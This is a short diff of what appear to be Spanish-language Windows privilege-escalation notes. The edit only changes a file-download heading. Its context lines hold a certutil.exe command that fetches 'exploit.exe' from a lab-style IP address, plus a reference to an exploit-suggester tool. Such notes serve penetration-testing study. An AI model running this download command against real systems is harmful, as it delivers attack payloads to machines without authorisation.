@@ -100,9 +100,8 @@ netsh advfirewall firewall dump
 	[bitsadmin/wesng: Windows Exploit Suggester - Next Generation (github.com)](https://github.com/bitsadmin/wesng)
 
 ````
-## Funciones básicas
 
-### Descarga de archivos[](#descarga-de-archivos)
+### Descarga de archivos
 
 ```python
 certutil.exe -urlcache -f 10.10.14.4 exploit.exe
